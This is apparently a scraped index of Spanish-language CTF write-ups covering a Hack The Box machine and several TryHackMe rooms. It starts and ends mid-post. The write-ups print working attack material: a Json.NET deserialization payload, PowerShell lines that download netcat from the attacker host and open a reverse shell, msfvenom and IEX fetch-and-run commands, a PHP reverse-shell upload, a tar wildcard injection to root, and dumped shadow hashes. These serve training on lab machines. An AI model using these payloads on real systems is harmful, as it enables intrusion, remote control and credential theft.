-t \u0026gt; payload_jsonnet_nslookup.txt ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgbnNsb29rdXAgc2NrdWxsIDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9   Respuesta en Responder (nslookup) y tcpdump (ping).\nSHELL - userpool Tomamos el PoC que utilizamos para hacer ping a nuestra maquina y lo modificamos agregandole un comando de powershell para descargar netcat (nc.exe) y, al mismo tiempo ejecutar una shell inversa con netcat.\nComando:\n1  powershell -Command \u0026#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe\u0026#34; \u0026amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878   Payload:\n1 2 3 4 5 6 7 8 9  { \u0026#39;$type\u0026#39;:\u0026#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#39;, \u0026#39;MethodName\u0026#39;:\u0026#39;Start\u0026#39;, \u0026#39;MethodParameters\u0026#39;:{ \u0026#39;$type\u0026#39;:\u0026#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;, \u0026#39;$values\u0026#39;:[\u0026#39;cmd\u0026#39;,\u0026#39;/c powershell -Command \u0026#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe\u0026#34; \u0026amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878 \u0026#39;] }, \u0026#39;ObjectInstance\u0026#39;:{\u0026#39;$type\u0026#39;:\u0026#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;} }   Payload Base64:\n1  ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCAtQ29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzEwLjEwLjE0LjE0Ny9uYy5leGUgLU91dEZpbGUgYzovVXNlcnMvUHVibGljL25jLmV4ZSIgJiBDOi9Vc2Vycy9QdWJsaWMvbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTQ3IDc4NzggJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0NCg==   Codificamos el payload en base64 y lo enviamos, y obtenemos una shell inversa con el usuario userpool.\nY obtenemos nuestra flag user.txt.\nPrivilege Escalation Realizamos una enumeracion de los privilegios del usuario userpool, vemos que tenemos habilitado SeImpersonatePrivilege, para esta maquina y estos privilegios utilizamos JuicyPotato. Utilizamos la forma \u0026ldquo;automatica\u0026rdquo; de JuicyPotato. Realizamos las siguientes modificaciones en los archivos.\n1 2 3  Invoke-LovelyPotato.ps1 $RemoteDir = \u0026#34;http://10.10.14.147\u0026#34; $LocalPath = \u0026#34;C:/Users/Public\u0026#34;   Creamos nuestro payload con Msfvenom:\n1  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.147 LPORT=1339 -f exe -o meterpreter.exe   Configuramos metasploit:\n1 2 3 4  use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.14.147 set LPORT 1339   Descargamos el archivo de \u0026ldquo;automatizacion\u0026rdquo; de JuicyPotato:\n1  powershell -Command \u0026#34;IEX(New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.14.147/Invoke-LovelyPotato.ps1\u0026#39;)\u0026#34;   Si queremos realizarlo de forma manual podemos realizar los mismos pasos de la Maquina Conceal.\nAl terminar la ejecucion del script obtenemos nuestra shell en meterpreter.\nY nuestra flag root.txt.\n","description":"Descubrimos una vulnerabilidad de deserializacion en Json.net y usando ysoserial obtuvimos una shell inversa. Vemos que el usuario tiene permisos SeImpersonatePrivilege con ello escalamos privilegios utilizando JuicyPotato en su version para PowerShell.","id":106,"section":"posts","tags":["ftp","ysoserial","juicy potato","metasploit","deserialization",".net"],"title":"Hack The Box - Json","uri":"https://sckull.github.io/posts/json/"},{"content":"  CMesS es una maquina de TryHackMe, realizamos una enumeracion de subdominios para encontrar credenciales para Gila CMS, subir una shell inversa y obtener acceso. Realizamos movimiento lateral utilizando una contraseña dentro de un backup. Encontramos un cronjob que realiza backups con Tar, utilizamos wildcards para ejecutar una shell inversa como root.\nRoom    Titulo CMesS      Descripción Can you root this Gila CMS box?   Puntos 140   Dificultad Media   Maker optional     NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # Nmap 7.80 scan initiated Fri Feb 14 16:24:08 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.46.144 Nmap scan report for 10.10.46.144 Host is up (0.24s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) | 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) |_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: Gila CMS | http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 14 16:45:03 2020 -- 1 IP address (1 host up) scanned in 1254.76 seconds   HTTP A un principio veimas Gila CMS en el cual existe una vulnerabilidad de LFI pero el de esta maquina no es vulnerable.\nGOBUSTER Encontramos una larga lista de directorios, pero ninguno era de importancia hasta el momento.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  root@aoiri:~/tryhackme/cmess# gobuster dir -u cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t 35 /1 (Status: 200) /about (Status: 200) /01 (Status: 200) /login (Status: 200) /search (Status: 200) /blog (Status: 200) /index (Status: 200) /category (Status: 200) /0 (Status: 200) /feed (Status: 200) /themes (Status: 301) /admin (Status: 200) /assets (Status: 301) /tag (Status: 200) /author (Status: 200) /sites (Status: 301) /log (Status: 301) /tags (Status: 200) /1x1 (Status: 200) /lib (Status: 301) /src (Status: 301) /api (Status: 200) /robots.txt (Status: 200) /001 (Status: 200) /1pix (Status: 200) /fm (Status: 200) /tmp (Status: 301) /1a (Status: 200) /0001 (Status: 200) /1x1transparent (Status: 200) /1px (Status: 200) /1d (Status: 200) /1_1 (Status: 200) /1pixel (Status: 200) /0001-exploits (Status: 200) /01_hello (Status: 200) /1-1 (Status: 200) /1st (Status: 200) /00000001 (Status: 200)   WFUZZ - SUBDOMAINS Utilizamos wfuzz para poder enumerar los subdominios de la maquina, encontramos *** de subdominio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  root@aoiri:~/tryhackme/cmess# wfuzz -c -w subdomains-top1mil-5000.txt -u \u0026#34;http://cmess.thm\u0026#34; -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; --hl 107 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://cmess.thm/ Total requests: 5000 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000019: 200 30 L 104 W 934 Ch \u0026#34;***\u0026#34; 000002700: 400 12 L 53 W 422 Ch \u0026#34;m.\u0026#34; 000002795: 400 12 L 53 W 422 Ch \u0026#34;ns2.cl.bellsouth.net.\u0026#34; 000002883: 400 12 L 53 W 422 Ch \u0026#34;ns1.viviotech.net.\u0026#34; 000002885: 400 12 L 53 W 422 Ch \u0026#34;ns2.viviotech.net.\u0026#34; 000003050: 400 12 L 53 W 422 Ch \u0026#34;ns3.cl.bellsouth.net.\u0026#34; 000004081: 400 12 L 53 W 422 Ch \u0026#34;ferrari.fortwayne.com.\u0026#34; 000004082: 400 12 L 53 W 422 Ch \u0026#34;jordan.fortwayne.com.\u0026#34; 000004083: 400 12 L 53 W 422 Ch \u0026#34;quatro.oweb.com.\u0026#34; Total time: 131.3119 Processed Requests: 5000 Filtered Requests: 4991 Requests/sec.: 38.07726   ***.cmess.thm En el subdominio dev encontramos una contraseña del correo andre.\nSHELL - www-data Utilizamos las credenciales en el panel de administracion (/admin) con las credenciales que tenemos, una vez dentro subimos un archivo PHP de prueba para verificar que podamos ejecutar comandos, el archivo se subió en (/assets/).\n1 2 3 4  \u0026lt;?php echo \u0026#34;Testing if i can run commands:\u0026#34;; echo(exec(\u0026#34;ls \u0026#34;));   Vemos que nuestro codigo se ejecuto:\nEditamos el codigo para ejecutar una shell inversa:\n1 2 3  \u0026lt;?php exec(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 7878 \u0026gt;/tmp/f\u0026#34;); echo \u0026#34;\u0026gt;:)\u0026#34;;   Andre - User Enumeramos la maquina en busca de archivos interesantes, en la carpeta /opt encontramos un backup de la contraseña de Andre.\n1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@cmess:/$ ls -lah opt ls -lah opt total 12K drwxr-xr-x 2 root root 4.0K Feb 6 18:54 . drwxr-xr-x 22 root root 4.0K Feb 6 17:57 .. -rwxrwxrwx 1 root root 36 Feb 6 18:54 .password.bak www-data@cmess:/$ cd opt cd opt www-data@cmess:/opt$ cat .password.bak cat .password.bak andres backup password UQ[... snip ...]P6 www-data@cmess:/opt$   Utilizamos \u0026lsquo;su\u0026rsquo;, obtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Dentro de los archivos de la carpeta /tmp encontramos un archivo comprimido, de lo que parece /home/andre/backup/, que, la realiza el usuario root cada minuto. Para ver el cambio del archivo utilizamos date para ver la fecha de creacion y hora. Con lo anterior, renombramos la carpeta backup a backup_bak, creamos un symlink hacia la carpeta /root/, el usuario root realizara un backup de la carpeta /root/.\nO simplemente utilizar cat /etc/crontab para ver los crons\nAl pasar un minuto, vemos que la hora de creacion cambio y al extraer los archivos podemos ver nuestra flag root.txt.\nDe la misma forma podemos obtener la contraseña del usuario root (crackeada) haciendo un symlink hacia la carpeta /etc/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  andre@cmess:~$ ln -s /etc/ backup andre@cmess:~$ ls -lah total 3.0M drwxr-x--- 4 andre andre 4.0K Feb 14 18:27 . drwxr-xr-x 3 root root 4.0K Feb 6 18:00 .. lrwxrwxrwx 1 andre andre 11 Feb 14 18:27 backup -\u0026gt; /etc/ drwxr-x--- 2 andre andre 4.0K Feb 14 17:44 backup_bak lrwxrwxrwx 1 root root 9 Feb 6 18:48 .bash_history -\u0026gt; /dev/null -rwxr-x--- 1 andre andre 220 Feb 6 18:00 .bash_logout -rwxr-x--- 1 andre andre 3.7K Feb 6 18:00 .bashrc drwxr-x--- 2 andre andre 4.0K Feb 6 18:01 .cache -rwxr-x--- 1 andre andre 655 Feb 6 18:00 .profile -rwxrwxr-x 1 andre andre 3.0M Aug 22 11:38 pspy64 lrwxrwxrwx 1 root root 9 Feb 6 18:48 .sudo_as_admin_successful -\u0026gt; /dev/null -rwxr-x--- 1 andre andre 38 Feb 6 18:46 user.txt -rwxr-x--- 1 andre andre 635 Feb 9 11:00 .viminfo andre@cmess:~$ date Fri Feb 14 18:27:05 PST 2020 andre@cmess:~$   Descomprimimos el archivo y obtenemos la contraseña encriptada:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  andre@cmess:/tmp$ ls |grep sha gshadow gshadow- shadow shadow- andre@cmess:/tmp$ cat shadow root:$6$W.gDTDR8$XXB79ORIcggP9.Cl2HzbUf[... snip ...]sdXoYOhB7Da9mFPcca5a3DyKG1:18299:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18299:0:99999:7::: uuidd:*:18299:0:99999:7::: andre:$6$GeMRsVKt$KEQmO.oV7yzpLOVXjDX[... snip ...]uzhMTMl5J8rstkFQ1QD3/dLFS1yAMqj1kbiQWYvQ8.:18299:0:99999:7::: mysql:!:18299:0:99999:7::: sshd:*:18299:0:99999:7::: andre@cmess:/tmp$   SHELL - ROOT Para obtener una shell con el usuario root utilizamos las \u0026lsquo;wildcards\u0026rsquo; para ejecutar una shell inversa. Creamos un archivo con nuestra shell inversa y las \u0026lsquo;wildcards\u0026rsquo; que se ejecutarán junto con el comando tar:\n1 2 3  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 8989 \u0026gt;/tmp/f\u0026#34; \u0026gt; shell.sh echo \u0026#34;\u0026#34;\u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026#34;\u0026#34;\u0026gt; --checkpoint=1   Verificamos:\n1 2 3  andre@cmess:~/backup$ ls --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh andre@cmess:~/backup$   Esperamos y obtenemos una shell root:\nINFO - Wildcard Privilege Escalation\nANEXO - WWW-DATA MYSQL Dentro de la configuracion de la pagina vemos las credenciales para conectarse a la base de datos, encontramos algunas tablas interesantes pero ningun dato nos ayudo para ninguno de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  www-data@cmess:/var/www/html$ cat config.php cat config.php \u0026lt;?php $GLOBALS[\u0026#39;config\u0026#39;] = array ( \u0026#39;db\u0026#39; =\u0026gt; array ( \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;user\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, \u0026#39;pass\u0026#39; =\u0026gt; \u0026#39;r0otus3rpassw0rd\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;gila\u0026#39;, ), \u0026#39;permissions\u0026#39; =\u0026gt; array ( 1 =\u0026gt; array ( 0 =\u0026gt; \u0026#39;admin\u0026#39;, 1 =\u0026gt; \u0026#39;admin_user\u0026#39;, 2 =\u0026gt; \u0026#39;admin_userrole\u0026#39;, ), ), \u0026#39;packages\u0026#39; =\u0026gt; array ( 0 =\u0026gt; \u0026#39;blog\u0026#39;, ), \u0026#39;base\u0026#39; =\u0026gt; \u0026#39;http://cmess.thm/gila/\u0026#39;, \u0026#39;theme\u0026#39; =\u0026gt; \u0026#39;gila-blog\u0026#39;, \u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Gila CMS\u0026#39;, \u0026#39;slogan\u0026#39; =\u0026gt; \u0026#39;An awesome website!\u0026#39;, \u0026#39;default-controller\u0026#39; =\u0026gt; \u0026#39;blog\u0026#39;, \u0026#39;timezone\u0026#39; =\u0026gt; \u0026#39;America/Mexico_City\u0026#39;, \u0026#39;ssl\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;env\u0026#39; =\u0026gt; \u0026#39;pro\u0026#39;, \u0026#39;check4updates\u0026#39; =\u0026gt; 1, \u0026#39;language\u0026#39; =\u0026gt; \u0026#39;en\u0026#39;, \u0026#39;admin_email\u0026#39; =\u0026gt; \u0026#39;andre@cmess.thm\u0026#39;, \u0026#39;rewrite\u0026#39; =\u0026gt; true, );www-data@cmess:/var/www/html$   Utilizamos las credenciales con mysql, y en la tabla users de la base de datos gila encontramos la contraseña encriptada del usuario andre, ademas de eso encontramos las cookies del usuario andre:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | gila | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use gila; use gila; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +----------------+ | Tables_in_gila | +----------------+ | option | | page | | post | | postcategory | | postmeta | | user | | usermeta | | userrole | | widget | +----------------+ 9 rows in set (0.00 sec) mysql\u0026gt; select * from user; select * from user; +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ | id | username | email | pass | active | reset_code | created | updated | +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ | 1 | andre | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa | 1 | | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 | +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from usermeta; select * from usermeta; +----+---------+------------+----------------------------------------------------+ | id | user_id | vartype | value | +----+---------+------------+----------------------------------------------------+ | 1 | 1 | privilege | admin | | 2 | 1 | GSESSIONID | 1ik2ha97chatolvcena3moomw802zssf3e9tdo9v9fwl86w0uv | | 3 | 1 | GSESSIONID | 1mwxigp2xzt4oc6ka9neshxlzrnwefvsmenppbod9826mmhikz | +----+---------+------------+----------------------------------------------------+ 3 rows in set (0.00 sec)   ","description":"CMesS es una maquina de TryHackMe, realizamos una enumeracion de subdominios para encontrar credenciales para Gila CMS, subir una shell inversa y obtener acceso. Realizamos movimiento lateral utilizando una contraseña dentro de un backup. Encontramos un cronjob que realiza backups con Tar, utilizamos wildcards para ejecutar una shell inversa como root.","id":107,"section":"posts","tags":["cron","wildcard privesc"],"title":"TryHackMe - CMesS","uri":"https://sckull.github.io/posts/cmess/"},{"content":"  Retro es una maquina de TryHackMe con Sistem Windows expone RDP por donde ingresamos con credenciales en comentarios de WordPress. Obtuvimos acceso privilegiado con informacion que encontramos en el historial de Chrome.\nRoom    Titulo Retro      Descripción New high score!   Puntos 690   Dificultad Dificil   Maker DarkStar7471     NMAP Escaneo de puertos tcp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # Nmap 7.80 scan initiated Thu Feb 13 16:45:26 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.69.12 Nmap scan report for 10.10.69.12 Host is up (0.23s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=RetroWeb | Not valid before: 2019-12-07T23:49:24 |_Not valid after: 2020-06-07T23:49:24 |_ssl-date: 2020-02-13T22:50:58+00:00; -1s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 13 16:50:59 2020 -- 1 IP address (1 host up) scanned in 333.22 seconds   HTTP GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2  root@aoiri:~/tryhackme/retro# gobuster dir -u 10.10.69.12 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t 105 -x php,asp,aspx,txt,html /retro (Status: 301)   /retro Dentro de la pagina encontramos un post el cual contiene un comentario del usuario wade.\nRDP - User Consideramos que \u0026lsquo;parzival\u0026rsquo; es una contraseña del usuario wade, utilizamos el servicio RDP de la maquina para utilizar esta informacion. Utilizamos vinagre para conectarnos a la maquina. Obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos la maquina y vemos en el historial un CVE que el usuario estuvo buscando ademas de eso un archivo en la papelera de reciclaje. Investigamos que podria ser este archivo y encontramos que es utilizado para obtener privilegios de administracion en el CVE-2019-1388.\n CVE-2019-1388  Seguimos los pasos que nos indican en github, en caso de que no podamos realizar los pasos podemos utilizar el siguiente exploit:\n CVE-2017-0213  Build 14393:\nObtenemos nuestra shell como usuario administrator y nuestra flag root.txt.\n","description":"Retro es una maquina de TryHackMe con Sistem Windows expone RDP por donde ingresamos con credenciales en comentarios de WordPress. Obtuvimos acceso privilegiado con informacion que encontramos en el historial de Chrome.","id":108,"section":"posts","tags":["rdp"],"title":"TryHackMe - Retro","uri":"https://sckull.github.io/posts/retro/"},{"content":"  CTF collection Vol.2 en su version edicion es una serie de retos Web presentada por Deskel de TryHackMe.\nRoom    Titulo CTF collection Vol.2      Descripción Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.   Puntos 950   Dificultad Media   Maker DesKel     GOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  root@aoiri:~/tryhackme/ctfvolcollection2# gobuster dir -u http://10.10.51.83/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 35 -x php,html,txt /button (Status: 200) /cat (Status: 200) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /index.php (Status: 200) /index (Status: 200) /index.php (Status: 200) /iphone (Status: 200) /login (Status: 301) /robots (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /small (Status: 200) /static (Status: 200) root@aoiri:~/tryhackme/ctfvolcollection2#   Easter 1 La maquina esta diseñada para ser explotada via web para obtener las flags. Desde este punto de vista utilizamos gobuster para obtener los directorios, como siempre, revisamos el archivo robots.txt donde vemos una cadena en hexadecimal.\nUtilizamos CyberChef para obtener nuestra flag:\nEaster 2 Revisamos el archivo robots.txt nuevamente, donde vemos una URL codificada.\nUtilizamos CyberChef para poder decodificar la cadena y obtener nuestra flag.\n1  Base64 \u0026gt; URL decode \u0026gt; Base64 \u0026gt; \u0026#34;Remove spaces\u0026#34; \u0026gt; Base64 \u0026gt; \u0026#34;Remove spaces\u0026#34; \u0026gt; Base64   Visitamos la url que logramos decodificar, obtenemos nuestra flag.\nEaster 3 En el codigo fuente de /login encontramos nuestra flag.\nEaster 4 En la pagina /login encontramos un formulario, capturamos los datos del metodo POST y utilizamos SQLMAP para realizar una inyeccion SQL POST. Obtenemos la contraseña de DesKel y la crackeamos con md5hashing\n1 2 3 4 5 6 7 8  Database: THM_f0und_m3 Table: nothing_inside [1 entry] +-------------------------+ | Easter_4 | +-------------------------+ | THM{ ... snip ... } | +-------------------------+   Easter 5 De la misma forma obtenemos los datos de la base de datos.\n1 2 3 4 5 6 7 8 9  Database: THM_f0und_m3 Table: user [2 entries] +----------+------------------------------------+ | username | password | +----------+------------------------------------+ | DesKel | 05f3672ba[... snip ...]0070d1b | | Skidy | He is a nice guy, say hello for me | +----------+------------------------------------+   Easter 6 Vemos los headers de la pagina principal.\nEaster 7 Utilizamos el cookie Invited y con burpsuite le pasamos un numero, al ingresar el numero correcto obtenemos nuestra flag.\nEaster 8 Utilizamos los headers de Iphone.\nSolucion:\nEaster 9 Visitamos la pagina /ready y vemos el codigo fuente donde encontramos la flag.\nEaster 10 Debemos reclamar nuestro voucher.\nSolucion, referenciamos hacia tryhackme.com en los headers:\nEaster 11 En las opciones de la pagina principal vemos cuatro, pero vemos que \u0026ldquo;Deskel\u0026rdquo; prefiere huevo (egg). Enviamos egg en lugar de las opciones disponibles.\nSolucion:\nEaster 12 En el codigo javascript de la pagina encontramos una funcion, la ejecutamos para obtener nuestra flag.\nEaster 13 El reto 9 nos lleva al 13, la misma dinamica, el codigo fuente.\nEaster 14 En el codigo fuente de la pagina principal vemos un comentario que contiene una imagen codificada en base64. Renderizamos la imagen o descomentamos el comentario para obtener la flag.\nSolucion:\nEaster 15 En la pagina /game1 vemos un formulario con una pista. Utilizamos Burpsuite para insertar letras del abecedario, vemos el resultado de cada una de las letras que se muestran en \u0026ldquo;Your Hash\u0026rdquo; para poder comparar los datos (hash) con la pista (hash) que nos muestra en la pagina.\nSi ingresamos la letra \u0026ldquo;Z\u0026rdquo; y el resultado es \u0026ldquo;1000\u0026rdquo;, comparamos el resultado con la pista, si el resultado es igual que al de la pista tenemos nuestra primera letra \u0026ldquo;Z\u0026rdquo;. Repetimos hasta tener el resultado.\nResultado de 51 89 77 93 126 14 93 10.\nEaster 16 En la pagina /game2 debemos de presionar los tres botones al mismo tiempo, editamos el HTML para convertir los formularios en uno solo y damos click a un boton.\nSolucion:\nEaster 17 Encontramos un script en la pagina principal en binario.\nSolucion:\n1  Binary \u0026gt; Hex \u0026gt; Text   Binary \u0026gt; Hex\nHex \u0026gt; Text\nEaster 18 Enviamos en los headers egg: Yes.\nSolucion:\nEaster 19 Vemos una imagen.webp que no se muestra en la pagina.\nSolucion:\nEaster 20 En este reto nos muestran un usuario y contraseña las cuales debemos de enviar por el metodo POST, en la pagina principal.\nSolucion:\n","description":"CTF collection Vol.2 en su version edicion es una serie de retos Web presentada por Deskel de TryHackMe.","id":109,"section":"posts","tags":[],"title":"TryHackMe - CTF collection Vol.2","uri":"https://sckull.github.io/posts/ctf_collection_vol2/"},{"content":"  C4ptur3-th3-fl4g es una sala de TryHackMe que presenta una serie de retos, utilizamos CyberChef y herramientas en Linux para encontrar la solucion de cada uno de los retos.\nRoom    Titulo c4ptur3-th3-fl4g      Descripción A beginner level CTF challenge   Puntos 420   Dificultad Facil   Maker dcdavidlee     Hashes Algunas paginas con las cuales podemos analizar el hash y resolver los retos en linea.\nHash Identification\nHash Analyzer\nCyberChef\nTranslation \u0026amp; Shifting  #1 L33t o adivinando el mensaje. Reto:\nc4n y0u c4p7u23 7h3 f149?\nSolucion:\ncan you capture the flag?\n#2 From Binary Reto:\n01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001 